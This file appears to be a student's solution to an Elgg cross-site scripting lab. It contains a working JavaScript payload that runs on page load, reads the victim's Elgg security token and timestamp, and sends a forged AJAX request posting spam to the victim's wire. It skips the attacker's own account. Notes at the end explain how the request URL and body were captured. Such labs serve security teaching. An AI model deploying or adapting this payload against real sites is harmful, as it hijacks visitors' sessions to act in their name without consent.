<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
	//step 1
        var sendurl="/action/thewire/add"; //FILL IN
	//step 2
	var content=token+ts+ "&body=&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; //FILL IN
	
	if(elgg.session.user.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>


/*		***STEPS****
	similar to task 2.
	1. url was retrieved by inspecting the button pressed on the wire, i.e. the post request url.
	2. body of the content was retrieved by first manually posting on the victim's wire and then inspecting the post request body.
*/
